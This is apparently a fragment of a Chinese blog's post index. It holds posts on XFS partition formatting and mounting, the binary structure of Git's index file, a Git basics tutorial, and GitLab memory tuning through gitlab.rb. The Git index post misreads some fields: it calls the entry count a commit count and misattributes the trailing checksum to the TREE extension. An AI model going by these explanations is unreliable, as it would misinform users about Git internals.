finobt=1, sparse=1, rmapbt=0         =                       reflink=1data     =                       bsize=4096   blocks=262144, imaxpct=25         =                       sunit=0      swidth=0 blksnaming   =version 2              bsize=4096   ascii-ci=0, ftype=1log      =internal log           bsize=4096   blocks=2560, version=2         =                       sectsz=512   sunit=0 blks, lazy-count=1realtime =none                   extsz=4096   blocks=0, rtextents=0[root@host ~]# mkfs.xfs /dev/sdb6               // 使用xfs类型格式化sdb6meta-data=/dev/sdb6              isize=512    agcount=4, agsize=65536 blks         =                       sectsz=512   attr=2, projid32bit=1         =                       crc=1        finobt=1, sparse=1, rmapbt=0         =                       reflink=1data     =                       bsize=4096   blocks=262144, imaxpct=25         =                       sunit=0      swidth=0 blksnaming   =version 2              bsize=4096   ascii-ci=0, ftype=1log      =internal log           bsize=4096   blocks=2560, version=2         =                       sectsz=512   sunit=0 blks, lazy-count=1realtime =none                   extsz=4096   blocks=0, rtextents=0[root@host ~]# mkfs.xfs /dev/sdb7              // 使用xfs类型格式化sdb7                 meta-data=/dev/sdb7              isize=512    agcount=4, agsize=65536 blks         =                       sectsz=512   attr=2, projid32bit=1         =                       crc=1        finobt=1, sparse=1, rmapbt=0         =                       reflink=1data     =                       bsize=4096   blocks=262144, imaxpct=25         =                       sunit=0      swidth=0 blksnaming   =version 2              bsize=4096   ascii-ci=0, ftype=1log      =internal log           bsize=4096   blocks=2560, version=2         =                       sectsz=512   sunit=0 blks, lazy-count=1realtime =none                   extsz=4096   blocks=0, rtextents=0[root@host ~]# lsblk -p                        // 查看分区状态NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part ├─/dev/sdb6               8:22   0    1G  0 part └─/dev/sdb7               8:23   0    1G  0 part /dev/sr0                 11:0    1 1024M  0 rom\n\n挂载分区当格式化分区之后可以通过mount来进行挂载，挂载好的分区就可以使用了。\n[root@host ~]# mkdir -p /disk/sdb&#123;5..7&#125;     // 创建挂载目录[root@host ~]# mount /dev/sdb5 /disk/sdb5   // 挂载sdb5[root@host ~]# mount /dev/sdb6 /disk/sdb6   // 挂载sdb6[root@host ~]# mount /dev/sdb7 /disk/sdb7   // 挂载sdb7[root@host ~]# lsblk -p          // 查看分区状态NAME                    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT/dev/sda                  8:0    0   20G  0 disk ├─/dev/sda1               8:1    0    1G  0 part /boot└─/dev/sda2               8:2    0   19G  0 part   ├─/dev/mapper/rl-root 253:0    0   17G  0 lvm  /  └─/dev/mapper/rl-swap 253:1    0    2G  0 lvm  [SWAP]/dev/sdb                  8:16   0   20G  0 disk ├─/dev/sdb2               8:18   0    1K  0 part ├─/dev/sdb5               8:21   0    1G  0 part /disk/sdb5├─/dev/sdb6               8:22   0    1G  0 part /disk/sdb6└─/dev/sdb7               8:23   0    1G  0 part /disk/sdb7/dev/sr0                 11:0    1 1024M  0 rom\n","categories":["工具相关"],"tags":["开源工具","fdisk","系统管理"]},{"title":"Git Index文件数据结构","url":"/2024/12/06/Git%20Index%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","content":"前言在使用git工具管理项目的时候,.git目录下存放了index文件,这个文件是git的staging area,也叫做暂存区,也可以理解为当前工作区已经被托管文件的区域。index文件是使用二进制的方式进行存储的,具体内容是一些基础信息数据,然后面就是暂存区的条目信息。\n基础环境我这里简单创建了一个小环境具体创建过程如下\nE:\\TEMP\\TEMPGIT&gt;dir 驱动器 E 中的卷是 新加卷 卷的序列号是 F238-DE49 E:\\TEMP\\TEMPGIT 的目录2024/12/06  12:29    &lt;DIR&gt;          .2024/12/06  12:26    &lt;DIR&gt;          ..2024/12/06  12:27                 9 hello.txt2024/12/06  12:27                16 README.md               2 个文件             25 字节               2 个目录 24,408,936,448 可用字节E:\\TEMP\\TEMPGIT&gt;git initInitialized empty Git repository in E:/TEMP/TEMPGIT/.git/E:\\TEMP\\TEMPGIT&gt;git add hello.txtE:\\TEMP\\TEMPGIT&gt;git commit -m &quot;feat: add hello.txt&quot;[master (root-commit) 49c851f] feat: add hello.txt 1 file changed, 1 insertion(+) create mode 100644 hello.txtE:\\TEMP\\TEMPGIT&gt;git add README.mdE:\\TEMP\\TEMPGIT&gt;git commit -m &quot;feat: add README.md&quot;[master 699a3fc] feat: add README.md 1 file changed, 1 insertion(+) create mode 100644 README.md\n使用16进制编辑器打开项目下.git/index文件,具体内容如下\n44 49 52 43 00 00 00 02 00 00 00 02 67 52 7D 3528 C5 D9 74 67 52 7D 42 34 FA 3B A4 00 00 00 0000 00 00 00 00 00 81 A4 00 00 00 00 00 00 00 0000 00 00 10 75 7C B5 AA CC 80 7E B5 B1 FD 67 4E1F 51 EC 71 DE 00 22 A3 00 09 52 45 41 44 4D 452E 6D 64 00 67 52 7D 15 2C 21 10 D4 67 52 7D 1837 F7 20 24 00 00 00 00 00 00 00 00 00 00 81 A400 00 00 00 00 00 00 00 00 00 00 09 34 FE 99 B2F1 96 86 5F 6D E9 3E 35 0A E6 AE 3A FD 34 55 0600 09 68 65 6C 6C 6F 2E 74 78 74 00 54 52 45 4500 00 00 19 00 32 20 30 0A 7E 4E 0F A2 7B 51 A72C E3 BA 34 E5 70 F0 8B 89 63 58 C5 9F 4D 52 68C5 94 87 74 75 74 DA D9 91 8F 7E 56 3D B7 01 82CD\n基础信息基础信息就是前12bytes具体内容位,它们依次代表的内容如下\n44 49 52 43 00 00 00 02 00 00 00 02 \n前4byte是固定的文件头44 49 52 43,转换到10进制的内容就是DIRC.紧接着的4byte是记录git版本的00 00 00 02这里的git版本就是2再后面的4byte是记录git提交次数的00 00 00 02这里的提交次数是2\n条目信息条目信息的前62位是固定的,之后的长度是按照文件路径名字来计算的,按照上面的数据来说第一条的数据是\n67 52 7D 35 28 C5 D9 74 67 52 7D 42 34 FA 3B A400 00 00 00 00 00 00 00 00 00 81 A4 00 00 00 0000 00 00 00 00 00 00 10 75 7C B5 AA CC 80 7E B5B1 FD 67 4E 1F 51 EC 71 DE 00 22 A3 00 09 52 4541 44 4D 45 2E 6D 64 00\n下面依次说一下每个byte代表的作用\n\n8byte内容是ctime,创建文件的时间,前4byte是从1970年1月1日00:00:00计算的时间戳,后4byte是nanosecond微秒,一般前都用前面4byte,文件创建的时间戳67 52 7D 35转换过来就是1733459253即2024-12-06 12:27:33\n8byte内容是mtime,上次修改的时间,他的格式和CTIME一样,前4byte是时间戳,后面是nanosecond微秒。67 52 7D 42转换的时间戳是1733459266即2024-12-06 12:27:46\n4byte的内容应该是device即文件存储的设备,我这里是00 00 00 00,全0肯定是有些问题,具体问题我也没研究出来。\n4byte的内容应该是Inode即文件在设备的文件系统中存储的具体块的编号,我这里是00 00 00 00,全0肯定是有些问题,具体问题我也没研究出来。\n4byte的内容是文件权限,我这里的内容为00 00 81 A4转换之后就是100644,100是代表普通文件,后面的644就是linux中的权限,这里不多说\n4byte的内容是uid,大概率是因为我用的win系统,所以没展示出来全是0x00\n4byte的内容是gid,大概率是因为我用的win系统,所以没展示出来全是0x00\n4byte的内容是文件大小,我这里是00 00 00 10转换过来即16,就是16字节\n20byte的内容是sha-1,我这里的内容为75 7C B5 AA CC 80 7E B5 B1 FD 67 4E 1F 51 EC 71 DE 00 22 A3,这个内容在objects目录中会有对应的文件,这个可以理解为对应文件的索引,以这个sha-1为例,他的位置应该是在.git\\objects\\75\\7cb5aacc807eb5b1fd674e1f51ec71de0022a3\n2byte的内容是文件的长度,我这里的长度是00 09即9位\n文件名在条目中的占用长度是不固定的,以当前条目为例,其长度为9字节,文件名内容是 52 45 41 44 4D 45 2E 6D 64 00,转换后为 README.md.但它实际占用了10字节.这是因为在存储时,文件名后会填充0x00即 00作为分隔符.为了满足存储规则,文件名会按照8字节对齐的方式进行填充.因此，如果条目的总字节长度不能被8整除,会继续填充 0x00,直到长度达到8的倍数.比如本条目就通过填充一个 00 字节使得长度符合对齐要求\n\n扩展信息条目解析结束之后,后面还有一段信息,这段信息的内容是index文件的扩展信息,内容如下\n54 52 45 45 00 00 00 19 00 32 20 30 0A 7E 4E 0FA2 7B 51 A7 2C E3 BA 34 E5 70 F0 8B 89 63 58 C59F 4D 52 68 C5 94 87 74 75 74 DA D9 91 8F 7E 563D B7 01 82 CD\n前面四个字节是TREE,代表记录的是TREE的信息,这里会记录当前HEAD的SHA-1还有index的SHA-1来确定文件的完整性,这里当前HEAD的sha-1是7E 4E 0F A2 7B 51 A7 2C E3 BA 34 E5 70 F0 8B 89 63 58 C5 9F紧接着就是index的SHA-1,即4D 52 68 C5 94 87 74 75 74 DA D9 91 8F 7E 56 3D B7 01 82 CD\n","categories":["折腾相关"],"tags":["数据结构","git"]},{"title":"Git-版本控制工具","url":"/2022/06/04/Git-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7/","content":"概述Git是一个开源免费的分布式版本控制系统，可以快速高效的来管理项目代码。\n官网：https://git-scm.com/\n安装Windows\n  \n\nLinuxyum -y install git\n\n工作流程\n在本地主机会分三个区域，分别为工作区、暂存区、本地库，如果需要多人协作可以上传到一个远程仓库里面提供他人管理代码。\n\n\n\n区域\n作用\n\n\n\n工作区\n写代码的过程都会在工作区内完成，写完之后需要上传到暂存区\n\n\n暂存区\n代码写完之后需要放到暂存区，确定没有问题之后需要把版本信息和暂存区的内容上传到本地库\n\n\n本地库\n全部的版本都在本地库里面\n\n\n远程库\n远程仓库是整个团队中所有人都可以访问的地方。\n\n\n代码管理设置签名签名就是上传到本地库，远程仓库的时候的身份。\n$ git config --global user.name &quot;BoyChai&quot;$ git config --global user.email &quot;1972567225@qq.com&quot;$ git config --global --list\n\n初始化仓库默认本地是没有仓库的，这时候我们需要初始化一个仓库，进入到对应项目的目录执行命令”git init”,例如\n$ mkdir project$ cd project/$ git initInitialized empty Git repository in /root/project/.git/\n\n初始化好了之后会在本地创建一个”.git”的目录，这个目录就是存放暂存区和本地库的地方。此时项目文件夹就是工作区。\n提交暂存区此时目录里创建一个文件可以通过命令”git add [file]”将文件提交到暂存区,例如\n$ echo 111 &gt; test01$ git add test01\n\n提交本地库提交完暂存区之后可以通过命令”git commit -m “[版本信息]””提交到本地库里面,例如\n$ git commit -m &quot;test01&quot;[master (root-commit) 776b640] test01 1 file changed, 1 insertion(+) create mode 100644 test01\n\n状态显示当前分支,并且查看在你上次提交之后是否有对文件进行再次修改。\ngit status \n\n\n\n记录通过命令”git log”显示历史提交记录,例如\n$ git logcommit 4240a74fc27134b79addead798a10d8d4808ec91Author: BoyChai &lt;1972567225@qq.com&gt;Date:   Sat Jun 4 09:40:10 2022 -0400    test03commit 93d1896fcc57d4b84733f70bffab8d68b56a2f0bAuthor: BoyChai &lt;1972567225@qq.com&gt;Date:   Sat Jun 4 09:40:02 2022 -0400    test02commit 776b640b6bf839f27a5ef099f33c11e66aa8f1daAuthor: BoyChai &lt;1972567225@qq.com&gt;Date:   Sat Jun 4 09:38:43 2022 -0400    test01\n\n也可以让他进行简易的输出提交记录\n”git log –pretty&#x3D;onelint“或“git log –oneline”\n还可以使用命令“git reflog”来查看可引用的历史版本记录，他输出会带一个tag，输出内容如下\n[root@gitlab project]# git reflog4240a74 HEAD@&#123;0&#125;: commit: test0393d1896 HEAD@&#123;1&#125;: commit: test02776b640 HEAD@&#123;2&#125;: commit (initial): test01\n\n回滚可以让代码回到历史的某个版本\ngit reset --hard [版本ID]\n\n版本的ID可以使用查看记录的方法获得\n[root@gitlab project]# git reflog4240a74 HEAD@&#123;0&#125;: commit: test0393d1896 HEAD@&#123;1&#125;: commit: test02776b640 HEAD@&#123;2&#125;: commit (initial): test01[root@gitlab project]# git reset --hard 93d1896    //回滚到test02HEAD is now at 93d1896 test02\n\n\n\n分支管理概述如果涉及团队开发合作可以使用分支来分配工作，在写代码的时候，如果有多个功能需要去实现而且是一个团队进行编写，都在一个主分支上编写代码可能并不是很好管理，这个时候可以通过分支来管理，把每一个功能都单独创建一个分支让一个人去编写或者几个人去编写，当这个功能完善的时候就可以和主分支进行合并。\n查看分支使用命令”git branch -v”来查看，例如\n$ git branch -v* master 93d1896 test02\n\n\n\n创建分支使用命令”git branch [分支名称]”来创建，例如\n$ git branch branch1$ git branch -v  branch1 93d1896 test02* master  93d1896 test02\n\n切换分支使用命令”git checkout [分支名称]”来切换分支，例如\n$ git checkout branch1Switched to branch &#x27;branch1&#x27;$ git branch -v* branch1 93d1896 test02  master  93d1896 test02\n\n合并分支当分支的代码提交好了之后可以进行合并分支，合并分支需要将分支切换到master(主分支)，然后使用命令”git merge [分支名称]”来合并分支，之后使用“commit”来提交，例如\n$ git branch -v* branch1 93d1896 test02  master  93d1896 test02$ echo aaa &gt; branch1_file01$ git add branch1_file01$ git commit -m &quot;branch1_分支提交&quot;[branch1 af08213] branch1_分支提交 1 file changed, 1 insertion(+) create mode 100644 branch1_file01$ git checkout masterSwitched to branch &#x27;master&#x27;$ git branch -v  branch1 af08213 branch1_分支提交* master  93d1896 test02[root@gitlab project]# echo bbb &gt; master_file1[root@gitlab project]# git add master_file1[root@gitlab project]# git commit -m &quot;master提交&quot;[master 731413b] master提交 1 file changed, 1 insertion(+) create mode 100644 master_file1[root@gitlab project]# git branch -v  branch1 af08213 branch1_分支提交* master  731413b master提交[root@gitlab project]# git merge branch1 //merge之后会弹出一下内容，第一行是写合并备注的，类似于命令&quot;it commit -m&quot;的备注----------------------------------------------------------------------------------Merge branch &#x27;branch1&#x27;# Please enter a commit message to explain why this merge is necessary,# especially if it merges an updated upstream into a topic branch.## Lines starting with &#x27;#&#x27; will be ignored, and an empty message aborts# the commit.----------------------------------------------------------------------------------//保存之后显示Merge made by the &#x27;recursive&#x27; strategy. branch1_file01 | 1 + 1 file changed, 1 insertion(+) create mode 100644 branch1_file01$ git commit # On branch masternothing to commit, working directory clean$ git branch -v  branch1 af08213 branch1_分支提交* master  6a764f1 Merge branch &#x27;branch1&#x27;\n\n上面这个是主分支和分支都改变代码的情况下进行合并，如果没有改变主分支的代码就进行合并则不会弹出merge之后的内容\n分支代码冲突当分支和主分支的代码产生冲突该，例如\n$ git branch branch2$ git checkout masterSwitched to branch &#x27;master&#x27;$ cat &gt; file.txt &lt;&lt;EOF&gt; 111&gt; 222&gt; 444&gt; EOF$ cat file.txt111222444$ git add file.txt$ git commit -m &quot;master_提交&quot;[master d7e9855] master_提交 1 file changed, 3 insertions(+) create mode 100644 file.txt[root@gitlab project]# git checkout branch2Switched to branch &#x27;branch2&#x27;$ cat &gt; file.txt &lt;&lt;EOF&gt; 111&gt; 222&gt; 333&gt; 444&gt; EOF$ cat file.txt111222333444$ git add file.txt$ git commit -m &quot;branch2_提交&quot;[branch2 3bac7d1] branch2_提交 1 file changed, 4 insertions(+) create mode 100644 file.txt\n\n此时master和分支branch2提交的最新版本的file.txt文件是有冲突的，这个时候进行合并会出现一下问题\n$ git checkout masterSwitched to branch &#x27;master&#x27;[root@gitlab project]# git branch -v  branch1 af08213 branch1_分支提交  branch2 3bac7d1 branch2_提交* master  d7e9855 master_提交$ git merge branch2Auto-merging file.txtCONFLICT (add/add): Merge conflict in file.txtAutomatic merge failed; fix conflicts and then commit the result.\n\n此时查看冲突文件会发现文件里的内容发生了改变\n$ cat file.txt111222&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD=======333&gt;&gt;&gt;&gt;&gt;&gt;&gt; branch2444\n\n文件的意思就是中间出现了333这一行，如果想要保留branch2分支的内容则就改成这样\n$ cat file.txt111222333444\n\n如果不想保留branch2分支的内容则就删除对应内容，例如\n$ cat file.txt111222444\n\n上面两种保留方式选择一种之后，使用命令”git add [冲突文件]”来解决冲突,并使用命令”git commit”进行合并\n$ cat file.txt111222333444$ git add file.txt$ git commit -m &quot;master-branch2解决冲突&quot;[master 00721ab] master-branch2解决冲突$ git branch -v  branch1 af08213 branch1_分支提交  branch2 3bac7d1 branch2_提交* master  00721ab master-branch2解决冲突\n\n远程仓库管理创建远程仓库远程仓库的类型有很多，Github,Gitee,Gitlab,Gogs等等，这里采用github作为示范，如图\n\n\n推送代码推送代码到github之前还需要一个用户token，打开github的settings -&gt; Developer settings -&gt; Personal access tokens -&gt; Generate new token，日期我选的7天权限根据自己情况自己勾选，之后店家Generate  token,如图\n\n\n之后当我们的代码已经提交完到本地库里了，我们可以通过命令”git push ‘仓库地址’  ‘分支名称’ “进行推送，推送过程中需要输入用户名和密码，这个密码实际上就是我们刚才创建的token,例如\n$ git push https://github.com/BoyChai/Git_test.git masterUsername for &#x27;https://github.com&#x27;: BoyChaiPassword for &#x27;https://BoyChai@github.com&#x27;:Counting objects: 20, done.Delta compression using up to 4 threads.Compressing objects: 100% (14/14), done.Writing objects: 100% (20/20), 1.53 KiB | 0 bytes/s, done.Total 20 (delta 7), reused 0 (delta 0)remote: Resolving deltas: 100% (7/7), done.To https://github.com/BoyChai/Git_test.git * [new branch]      master -&gt; master\n\n克隆代码当远程仓库发生改变想要同步到本地的时候可以使用命令”git pull ‘仓库地址’  ‘分支名称’ “，例如\n$ git pull https://github.com/BoyChai/Git_test.git masterFrom https://github.com/BoyChai/Git_test * branch            master     -&gt; FETCH_HEADAlready up-to-date.\n\n别名每次去推送、克隆代码的时候都需要输入一段很长的仓库地址，并不是很方便，可以使用命令”git remote add ‘别名’ ‘仓库地址’ “来创建别名，例如\n$ git remote add git_test https://github.com/BoyChai/Git_test.git$ git remote -v git_test        https://github.com/BoyChai/Git_test.git (fetch)git_test        https://github.com/BoyChai/Git_test.git (push)\n\n之后相关代码仓库地址的位置都可以替换成别名来操作，例如\ngit push git_test mastergit pull git_test master\n\n团队协作团队协作需要在远程仓库里添加团队内部的人，在Github上的具体流程为 打开对应的项目 -&gt; Settings -&gt; Collaborators -&gt; Add people\n\n\n点击Select a collaborator above之后会给一个链接，需要发给对方进行验证，通过之后就可以在此仓库进行协作了\n跨团队协作跨团队操作需要进行Fork操作，如图\n点击fork之后会让你写一个仓库名称，之后这个仓库会以刚才的仓库名称变成你仓库里的一个项目，你可以自己任意更改提交克隆，当代码写好提交到自己fork的仓库之后，去对方的仓库里面点击pull requests\n\n创建一个之后会出现一个版本比较的一个东西，让你选择版本进行对比，第一个选择就是他的仓库，第二个就是自己fork的仓库，选择好之后会出现修改的内容对比，然后进行创建，创建之后对方会受到一个请求，当对方同意的时候代码就会自动合并到对方仓库里。\n","categories":["工具相关"],"tags":["开源工具","git","版本控制"]},{"title":"GitLab内存占用过高的问题","url":"/2024/11/12/GitLab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E9%97%AE%E9%A2%98/","content":"内存占用gitlab内存占用是出奇的高，我这里高的离谱，top一看全都是gitlab的进程\n组件调优进入容器通过命令gitlab-ctl status可以看到所有运行的组件\nroot@gitlab:/# gitlab-ctl statusrun: alertmanager: (pid 680) 162s; run: log: (pid 483) 296srun: gitaly: (pid 275) 324s; run: log: (pid 272) 324srun: gitlab-exporter: (pid 651) 167s; run: log: (pid 407) 315srun: gitlab-kas: (pid 350) 317s; run: log: (pid 349) 317srun: gitlab-workhorse: (pid 359) 317s; run: log: (pid 358) 317srun: logrotate: (pid 274) 324s; run: log: (pid 271) 324srun: nginx: (pid 363) 317s; run: log: (pid 362) 317srun: postgres-exporter: (pid 692) 161s; run: log: (pid 545) 290srun: postgresql: (pid 361) 317s; run: log: (pid 360) 317srun: prometheus: (pid 661) 166s; run: log: (pid 465) 302srun: puma: (pid 354) 317s; run: log: (pid 353) 317srun: redis: (pid 276) 324s; run: log: (pid 273) 324srun: redis-exporter: (pid 653) 167s; run: log: (pid 429) 310srun: sidekiq: (pid 365) 317s; run: log: (pid 364) 317srun: sshd: (pid 33) 354s; run: log: (pid 32) 354s\n默认gitlab会开启这么多的组件,它们的用处如下\n\nalertmanager：用于处理和管理 Prometheus 监控的告警。它负责接收告警信息并发送通知（例如邮件、Slack）。\ngitaly：Git 仓库的服务管理器，负责优化 Git 操作的性能。GitLab 使用 Gitaly 来高效处理仓库请求，如分支操作和合并请求。\ngitlab-exporter：用于导出 GitLab 的性能和健康数据，以便通过 Prometheus 进行监控。\ngitlab-kas：GitLab Kubernetes Agent Server (KAS) 服务，支持 GitLab 与 Kubernetes 集群的通信，用于 DevOps 管理和 CI&#x2F;CD 集成。\ngitlab-workhorse：HTTP 服务器，用于处理来自客户端的请求（如文件上传&#x2F;下载）并与 GitLab Rails 应用交互。\nlogrotate：日志文件轮转工具，定期管理日志文件，防止日志占用过多的磁盘空间。\nnginx：Web 服务器和反向代理，将来自客户端的 HTTP 请求转发到 GitLab 工作进程（如 puma 和 gitlab-workhorse）。\npostgres-exporter：将 PostgreSQL 数据库的性能指标导出到 Prometheus，用于数据库监控。\npostgresql：GitLab 使用的 PostgreSQL 数据库，用于存储应用数据，如用户信息、项目和配置等。\nprometheus：监控和告警系统，收集 GitLab 和其组件的性能指标，并存储和显示相关监控信息。\npuma：Rails 应用服务器，运行 GitLab 的核心应用逻辑，处理所有核心业务逻辑和 API 请求。\nredis：内存数据库，GitLab 使用 Redis 存储缓存、会话数据和队列任务。\nredis-exporter：导出 Redis 的监控指标到 Prometheus，以监控 Redis 的状态。\nsidekiq：后台任务处理服务，GitLab 使用它来处理异步任务，如发送通知、执行计划任务等。\nsshd：GitLab 的 SSH 服务，使用户可以通过 SSH 协议进行 Git 仓库操作（如推送和克隆），提高数据传输的安全性。\n\n对于个人来说，alertmanager、gitlab-exporter、gitlab-kas、postgres-exporter、prometheus、redis-exporter可以说是基本用不到基本都是监控相关的组件，然后gitlab-kas是用来对接k8s的，如果用不到这个功能也完全可以关闭，还有就是如果本地环境有redis和postgresql，这俩组件也完全也可移除。对于生产环境，可以根据上面所写的组件作用来做移除，如果是一些小型企业我感觉这些组件基本上也用不到，开着就是吃内存。下面开始移除组件编辑gitlab.rb配置文件，主要是做下面更改\n# 关闭alertmanager组件,这条配置大概是再2423行，默认是注释的，他的默认值为truealertmanager[&#x27;enable&#x27;] = false# 关闭gitlab_exporter组件,这条配置大概率是在2536行，默认是注释的，他的默认值为truegitlab_exporter[&#x27;enable&#x27;] = false# 关闭gitlab_kas组件,这条配置大概率是在2152行，默认是注释的，他的默认值是true gitlab_kas[&#x27;enable&#x27;] = false# 关闭postgres_exporter组件,大概在2497行,默认是注释的，默认值是truepostgres_exporter[&#x27;enable&#x27;] = false# 关闭redis-exporter组件,大概率是在2472行,默认是注释的，默认值是trueredis_exporter[&#x27;enable&#x27;] = false# 关闭prometheus组件,大概率是在2576行,默认是注释的，默认值是trueprometheus_monitoring[&#x27;enable&#x27;] = false\n配置调优在配置种还有不少线程、内存相关的配置，可以参考下面进行修改\n# 在1303行有一段下面的配置,他默认值是20,他是sidekiq组件的并发数,因为我是个人使用,我这里依次改成15、10、5发现区别不大,我这里直接用5了,可以根据个人环境来调试sidekiq[&#x27;concurrency&#x27;] = 5# 在1419行,有一个postgresql的缓存,这个默认是256MB,我这里直接改成64MB了postgresql[&#x27;shared_buffers&#x27;] = &quot;64MB&quot;# 在1506行,有一个postgresql的线程数量,它默认为8,我这里改成4了 postgresql[&#x27;max_worker_processes&#x27;] = 4# 在1271行,有一个Puma线程最大占用,默认使1024,这里修改成256puma[&#x27;per_worker_max_memory_mb&#x27;] = 256# 在2543行有一段gitlab_exporter组件的配置,默认是true,给他改成falsegitlab_exporter[&#x27;enable&#x27;] = false# 然后再1243有这么几段配置,它们分别代表工作进程数,然后工作进程的线程池大小# 默认是2个工作进程最小4最大4,算下来就是8个线程,这里进行修改puma[&#x27;worker_processes&#x27;] = 2puma[&#x27;min_threads&#x27;] = 1puma[&#x27;max_threads&#x27;] = 2\n外置数据库如果要用外置存储数据库，则可以参考修改下面配置\npostgresql[&#x27;enable&#x27;] = falsegitlab_rails[&#x27;db_adapter&#x27;] = &quot;postgresql&quot;gitlab_rails[&#x27;db_encoding&#x27;] = &quot;unicode&quot;gitlab_rails[&#x27;db_database&#x27;] = &quot;gitlab&quot;gitlab_rails[&#x27;db_username&#x27;] = &quot;gitlab&quot;gitlab_rails[&#x27;db_password&#x27;] = &quot;passwd&quot;gitlab_rails[&#x27;db_host&#x27;] = &quot;databases.workstation.boychai.xyz&quot;\n要注意的是，尽量修改配置，而不是增加配置\n外置缓存如果要用外置Reids缓存，则可以参考修改下面配置\nredis[&#x27;enable&#x27;] = falsegitlab_rails[&#x27;redis_host&#x27;] = &quot;databases.workstation.boychai.xyz&quot;gitlab_rails[&#x27;redis_password&#x27;] = &quot;passwd&quot;# 这个是redis的命名空间gitlab_rails[&#x27;redis_database&#x27;] = 1\n要注意的是，尽量修改配置，而不是增加配置\n加载配置我当前配置如下\n[root@localhost config]# cat gitlab.rb |grep -Ev &quot;^#|^$&quot;external_url &#x27;......&#x27;puma[&#x27;worker_processes&#x27;] = 2puma[&#x27;min_threads&#x27;] = 1puma[&#x27;max_threads&#x27;] = 2puma[&#x27;per_worker_max_memory_mb&#x27;] = 256sidekiq[&#x27;concurrency&#x27;] = 5postgresql[&#x27;shared_buffers&#x27;] = &quot;64MB&quot;postgresql[&#x27;max_worker_processes&#x27;] = 2gitlab_kas[&#x27;enable&#x27;] = falsealertmanager[&#x27;enable&#x27;] = falseredis_exporter[&#x27;enable&#x27;] = falsepostgres_exporter[&#x27;enable&#x27;] = falsegitlab_exporter[&#x27;enable&#x27;] = falseprometheus_monitoring[&#x27;enable&#x27;] = false\n执行gitlab-ctl reconfigure命令进行重载配置,然后直接重启容器\nroot@gitlab:/# gitlab-ctl reconfigure......[2024-11-11T13:17:13+00:00] INFO: Running report handlersRunning handlers complete[2024-11-11T13:17:13+00:00] INFO: Report handlers completeInfra Phase complete, 5/633 resources updated in 38 secondsgitlab Reconfigured!root@gitlab:/# gitlab-ctl restartok: run: gitaly: (pid 1766) 0sok: run: gitlab-workhorse: (pid 1773) 0sok: run: logrotate: (pid 1798) 1sok: run: nginx: (pid 1806) 0sok: run: postgresql: (pid 1820) 0sok: run: puma: (pid 1847) 0sok: run: redis: (pid 1852) 0sok: run: sidekiq: (pid 1864) 0sok: run: sshd: (pid 1893) 0s\n再次执行gitlab-ctl status查看组件状态\nroot@gitlab:/# gitlab-ctl statusrun: gitaly: (pid 1931) 180s; run: log: (pid 332) 726srun: gitlab-workhorse: (pid 1942) 180s; run: log: (pid 437) 714srun: logrotate: (pid 1961) 180s; run: log: (pid 335) 726srun: nginx: (pid 1968) 179s; run: log: (pid 435) 714srun: postgresql: (pid 1984) 179s; run: log: (pid 432) 714srun: puma: (pid 1988) 178s; run: log: (pid 436) 714srun: redis: (pid 2007) 178s; run: log: (pid 330) 726srun: sidekiq: (pid 2016) 176s; run: log: (pid 433) 714srun: sshd: (pid 2499) 0s; run: log: (pid 40) 756s\n再次查看占用,这里是因为刚启动稳定在内存剩余2000m了,具体调优的方式可以参考本文,实际这个占用算式较低的了..\n外置数据环境在我本地K8s环境中，配置如下\n[root@control service-gitlab-config-pvc-362bde8b-f3d4-405f-8c00-683815f92fe0]# cat gitlab.rb |grep -Ev &quot;^#|^$&quot;external_url &#x27;xxxxxx&#x27;gitlab_rails[&#x27;smtp_enable&#x27;] = truegitlab_rails[&#x27;smtp_address&#x27;] = &quot;xxxxxx&quot;gitlab_rails[&#x27;smtp_port&#x27;] = 465gitlab_rails[&#x27;smtp_user_name&#x27;] = &quot;xxxxxx&quot;gitlab_rails[&#x27;smtp_password&#x27;] = &quot;xxxxxx&quot;gitlab_rails[&#x27;smtp_tls&#x27;] = truegitlab_rails[&#x27;gitlab_email_enabled&#x27;] = truegitlab_rails[&#x27;gitlab_email_from&#x27;] = &#x27;coding@boychai.xyz&#x27;gitlab_rails[&#x27;gitlab_email_display_name&#x27;] = &#x27;Codeing&#x27;gitlab_rails[&#x27;gitlab_email_reply_to&#x27;] = &#x27;admin@boychai.xyz&#x27;gitlab_rails[&#x27;db_adapter&#x27;] = &quot;postgresql&quot;gitlab_rails[&#x27;db_encoding&#x27;] = &quot;unicode&quot;gitlab_rails[&#x27;db_database&#x27;] = &quot;gitlab&quot;gitlab_rails[&#x27;db_username&#x27;] = &quot;gitlab&quot;gitlab_rails[&#x27;db_password&#x27;] = &quot;xxxxxxx&quot;gitlab_rails[&#x27;db_host&#x27;] = &quot;xxxxxxx&quot;gitlab_rails[&#x27;redis_host&#x27;] = &quot;xxxxxxx&quot;gitlab_rails[&#x27;redis_password&#x27;] = &quot;xxxxxxx&quot;gitlab_rails[&#x27;redis_database&#x27;] = 1puma[&#x27;per_worker_max_memory_mb&#x27;] = 256sidekiq[&#x27;enable&#x27;] = truesidekiq[&#x27;concurrency&#x27;] = 5postgresql[&#x27;enable&#x27;] = falsepostgresql[&#x27;shared_buffers&#x27;] =  &quot;64MB&quot;postgresql[&#x27;max_worker_processes&#x27;] = 4redis[&#x27;enable&#x27;] = falselogrotate[&#x27;enable&#x27;] = truegitlab_kas[&#x27;enable&#x27;] = falseprometheus[&#x27;enable&#x27;] = falsealertmanager[&#x27;enable&#x27;] = falsegitlab_exporter[&#x27;listen_address&#x27;] = &#x27;0.0.0.0&#x27;patroni[&#x27;postgresql&#x27;][&#x27;max_worker_processes&#x27;] = 4\n在我本地K8s环境中，启动的组件如下\nroot@gitlab-cb5f6f764-6vhhz:/# gitlab-ctl statusrun: gitaly: (pid 265) 1471577s; run: log: (pid 293) 1471576srun: 